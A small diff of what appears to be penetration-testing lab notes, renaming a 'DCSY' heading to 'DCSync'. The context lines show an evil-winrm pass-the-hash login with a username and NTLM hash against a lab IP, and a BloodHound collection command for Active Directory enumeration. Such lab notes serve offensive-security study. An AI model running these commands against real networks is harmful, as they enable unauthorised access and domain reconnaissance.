@@ -1055,7 +1055,8 @@ evil-winrm -i 192.168.124.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f
 # SharpHOund
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Desktop -OutputPrefix test
 
-# DCSY
+# DCSync
+
 ```
 
 ### Nagoya
